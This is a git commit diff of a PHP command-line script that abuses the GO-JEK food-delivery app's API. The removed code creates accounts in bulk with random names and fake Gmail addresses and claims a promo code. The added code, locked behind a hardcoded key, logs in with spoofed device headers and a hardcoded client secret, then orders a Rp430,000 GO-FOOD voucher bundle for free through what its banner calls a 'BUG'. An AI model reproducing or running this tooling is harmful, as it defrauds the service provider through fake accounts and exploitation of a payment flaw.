5e49642a38b74a1c2235ba110aa1809cc6cfa7aa
affro11 <53412903+affro11@users.noreply.github.com>
2019-09-01 22:58:43 +0000

    Update gofood.php

--- gofood.php
+++ gofood.php
@@ -1,153 +1,86 @@
 <?php
 error_reporting(0);
-// Created By : Gidhan Bagus Algary
+require 'function.php';
 
-// Header
-$secret = '83415d06-ec4e-11e6-a41b-6c40088ab51e';
-$headers = array();
-$headers[] = 'Content-Type: application/json';
-$headers[] = 'X-AppVersion: 3.27.0';
-$headers[] = "X-Uniqueid: ac94e5d0e7f3f".rand(111,999);
-$headers[] = 'X-Location: -6.405821,106.064193';
+echo "[i] BUG GO-JEK BUY BUNDLE 'Paket langganan GO-FOOD hemat Rp430rb' FREE by DNF.ID\n\n";
 
-// Menu
-echo "\n=======================\n";
-echo "      GOFOOD Tools\n";
-echo "    By : Gidhan B.A\n";
-echo "=======================\n";
-echo "1. Register (Akun Baru)\n";
-echo "2. Login (Akun Lama)\n";
-echo "=======================\n";
-echo "Select Your Tools: ";
-$tools = trim(fgets(STDIN));
-	if($tools == "1")
-	{ 
-		echo "\n-----------------------------------------------\n";
-		echo "INFO - 08 Untuk Nomer Indo dan 1 Untuk Nomer US\n";
-		echo "-----------------------------------------------\n";
-		echo "Nomer HP: ";
-		$number = trim(fgets(STDIN));
-		$numbers = $number[0].$number[1];
-		$numberx = $number[5];
-		if($numbers == "08") { 
-			$number = str_replace("08","628",$number);
-		} elseif ($numberx == " ") {
-			$number = preg_replace("/[^0-9]/", "",$number);
-			$number = "1".$number;
-		}
-		$nama = nama();
-		$email = strtolower(str_replace(" ", "", $nama) . mt_rand(100,999) . "@gmail.com");
-		$data1 = '{"name":"' . $nama . '","email":"' . $email . '","phone":"+' . $number . '","signed_up_country":"ID"}';
-		$reg = curl('https://api.gojekapi.com/v5/customers', $data1, $headers);
-		$regs = json_decode($reg[0]);
-		// Verif OTP
-		if($regs->success == true) {
-			echo "Enter OTP: ";
-			$otp = trim(fgets(STDIN));
-			$data2 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $regs->data->otp_token . '"},"client_secret":"' . $secret . '"}';
-			$verif = curl('https://api.gojekapi.com/v5/customers/phone/verify', $data2, $headers);
-			$verifs = json_decode($verif[0]);
-			if($verifs->success == true) {
-				// Claim Voucher
-				$token = $verifs->data->access_token;
-				$headers[] = 'Authorization: Bearer '.$token;
-				$data3 = '{"promo_code":"SEMANGATMERDEKA"}';
-				$claim = curl('https://api.gojekapi.com/go-promotions/v1/promotions/enrollments', $data3, $headers);
-				$claims = json_decode($claim[0]);
-				if ($claims->success == true) {
-					echo $claims->data->message;
-					$xx = array('Content-Type: application/x-www-form-urlencoded');
-					$rp1 = curl('http://gopaysender.com/server3/', 'phone='.$number, $xx);
-					echo "\nAccount has been successfully filled with GOPAY Rp.10\n";
-					} else {
-					die ("Gagal claim voucher, silahkan untuk mencoba manual :)");
-					}
-			} else {
-				die("OTP salah goblok!");
-			}
-		} else {
-			die("ERROR - Pake nomer fresh lah goblok!");
-		}
-	} else if($tools == "2")
-	{
-		echo "\n-----------------------------------------------\n";
-		echo "INFO - 08 Untuk Nomer Indo dan 1 Untuk Nomer US\n";
-		echo "-----------------------------------------------\n";
-		echo "Nomer HP: ";
-		$number = trim(fgets(STDIN));
-		$numbers = $number[0].$number[1];
-		$numberx = $number[5];
-		if($numbers == "08") { 
-			$number = str_replace("08","628",$number);
-		} elseif ($numberx == " ") {
-			$number = preg_replace("/[^0-9]/", "",$number);
-			$number = "1".$number;
-		}
-		$login = curl('https://api.gojekapi.com/v3/customers/login_with_phone', '{"phone":"+' . $number . '"}', $headers);
-		$logins = json_decode($login[0]);
-		if($logins->success == true) {
-			echo "Enter OTP: ";
-			$otp = trim(fgets(STDIN));
-			$data1 = '{"scopes":"gojek:customer:transaction gojek:customer:readonly","grant_type":"password","login_token":"' . $logins->data->login_token . '","otp":"' . $otp . '","client_id":"gojek:cons:android","client_secret":"' . $secret . '"}';
-			$verif = curl('https://api.gojekapi.com/v3/customers/token', $data1, $headers);
-			$verifs = json_decode($verif[0]);
-			if($verifs->success == true) {
-				// Claim Voucher
-				$token = $verifs->data->access_token;
-				$headers[] = 'Authorization: Bearer '.$token;
-				$data3 = '{"promo_code":"SEMANGATMERDEKA"}';
-				$claim = curl('https://api.gojekapi.com/go-promotions/v1/promotions/enrollments', $data3, $headers);
-				$claims = json_decode($claim[0]);
-				if ($claims->success == true) {
-					echo $claims->data->message;
-					$xx = array('Content-Type: application/x-www-form-urlencoded');
-					$rp1 = curl('http://gopaysender.com/server3/', 'phone='.$number, $xx);
-					echo "\nAccount has been successfully filled with GOPAY Rp.10\n";
-					} else {
-					die ("Gagal claim voucher, silahkan untuk mencoba manual :)");
-					}
-			} else {
-				die("OTP salah goblok!");
-			}
-		} else {
-			die("ERROR - Nomer belum kedaftar goblok!");
-		}
-	}
-
-function nama()
-	{
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, "http://ninjaname.horseridersupply.com/indonesian_name.php");
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-	$ex = curl_exec($ch);
-	// $rand = json_decode($rnd_get, true);
-	preg_match_all('~(&bull; (.*?)<br/>&bull; )~', $ex, $name);
-	return $name[2][mt_rand(0, 14) ];
-	}
-
-function curl($url, $fields = null, $headers = null)
-    {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        if ($fields !== null) {
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
+// Input pin gopay
+echo '[?] Your key? ';
+$key = trim(fgets(STDIN));
+if ($key == 'sgblondon69') {
+    echo '[?] Phone? (62xxx atau 1xxx) ';
+    $phone = trim(fgets(STDIN));
+    $bearer = "";
+    $useruuid = "";
+    $uniqueid = rand(1000, 9999).rand(100, 999).'e'.rand(10, 99).'ff'.rand(100, 999).'b';
+    $header_login = array(
+        'X-AppVersion: 3.22.1',
+        'X-UniqueId: '.$uniqueid,
+        'X-Platform: Android',
+        'X-AppId: com.gojek.app',
+        'Accept: application/json',
+        'X-Session-ID: 0a6145d4-8c9e-4a26-83d7-b07b3fa29bc2',
+        'D1: 31:FC:81:8E:C4:F5:88:0D:92:02:6B:88:30:E0:EE:45:B5:24:E5:D9:FB:94:EE:18:05:36:DB:F1:36:AB:F9:6F',
+        'X-PhoneModel: ASUS,ZenFone Max Pro M1',
+        'X-PushTokenType: FCM',
+        'X-DeviceOS: Android,5.1.1',
+        'User-uuid: ',
+        'X-DeviceToken: ',
+        'Authorization: Bearer',
+        'Accept-Language: id-ID',
+        'X-User-Locale: id_ID',
+        'X-M1: 1:__9b2aedf2760e4cbb8ac111bbbdfc1c18,2:00f0ea90,3:1564269009625-1025403701101507221,4:15998,5:android-x86|2465|2,6:UNKNOWN,7:"Yummy",8:1080x1920,9:passive\,gps,10:1,11:UNKNOWN',
+        'Content-Type: application/json; charset=UTF-8',
+        'Connection: Keep-Alive',
+        'User-Agent: okhttp/3.12.1'
+    );
+    $deviceId = rand(100, 999).'b6d3c-'.rand(1000, 9999).'-'.rand(1000, 9999).'-9fb7-b1'.rand(10000, 99999).'e4c15';
+    $login_with_phone = request('https://api.gojekapi.com/v4/customers/login_with_phone', '{"phone":"+'.$phone.'"}', null, $header_login);
+    if (preg_match('/Nomor HP ini tidak valid/', $login_with_phone[1])) {
+        $regis = false;
+        echo "[i] Response: +62".$phone." [\e[0;0;42mNomor belum terdaftar\e[0m]\n";
+    } else if (preg_match('/Kode verifikasi sudah dikirim/', $login_with_phone[1])) {
+        $regis = false;
+        $otp_token = json_decode($login_with_phone[1])->data->login_token;
+        echo "[i] ".json_decode($login_with_phone[1])->data->message."\n[i] Kode OTP? ";
+        $otp = trim(fgets(STDIN));
+        $verify = request('https://api.gojekapi.com/v4/customers/login/verify', '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otp.'","otp_token":"'.$otp_token.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}', null, $header_login);
+        if (preg_match('/access_token/', $verify[1])) {
+            $bearer = json_decode($verify[1])->data->access_token;
+            $uuid = json_decode($verify[1])->data->customer->id;
+            echo "[i] Buy Paket langganan GO-FOOD hemat Rp430rb; 20 Voucher GO-FOOD, masing-masing diskon 25rb\n";
+            $header_login = array(
+                'X-AppVersion: 3.22.1',
+                'X-UniqueId: '.$uniqueid,
+                'X-Platform: Android',
+                'X-AppId: com.gojek.app',
+                'Accept: application/json',
+                'X-Session-ID: 0a6145d4-8c9e-4a26-83d7-b07b3fa29bc2',
+                'D1: 31:FC:81:8E:C4:F5:88:0D:92:02:6B:88:30:E0:EE:45:B5:24:E5:D9:FB:94:EE:18:05:36:DB:F1:36:AB:F9:6F',
+                'X-PhoneModel: ASUS,ZenFone Max Pro M1',
+                'X-PushTokenType: FCM',
+                'X-DeviceOS: Android,5.1.1',
+                'User-uuid: '.$uuid,
+                'X-DeviceToken: ',
+                'Authorization: Bearer '.$bearer,
+                'Accept-Language: en-ID',
+                'X-User-Locale: en_ID',
+                'X-M1: 1:__9b2aedf2760e4cbb8ac111bbbdfc1c18,2:00f0ea90,3:1564269009625-1025403701101507221,4:15998,5:android-x86|2465|2,6:UNKNOWN,7:"Yummy",8:1080x1920,9:passive\,gps,10:1,11:UNKNOWN',
+                'Content-Type: application/json; charset=UTF-8',
+                'Connection: Keep-Alive',
+                'User-Agent: okhttp/3.12.1'
+            );
+            $order = request('https://api.gojekapi.com/gopoints/v1/orders', '{"gopay_pin":"","payment_type":"points","voucher_batch_id":"8a706c6d-6e48-4bc0-9b38-b3539ca66c32","voucher_count":1}', null, $header_login);
+            echo "[i] Response: [\e[0;0;42m".$order[1]."\e[0m]\n";
+        } else {
+            $regis = false;
+            echo "[i] Response: [\e[0;0;41mKode OTP salah\e[0m]\n";
         }
-        if ($headers !== null) {
-            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-        }
-        $result   = curl_exec($ch);
-        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        
-        return array(
-            $result,
-            $httpcode
-        );
-	}
+    } else {
+        $regis = false;
+        echo "[i] Response: [\e[0;0;41mUps, ada yang salah\e[0m]\n";
+    }
+} else {
+    echo "[i] KOE UDU SGBLONDON COK\n";
+}
+?>
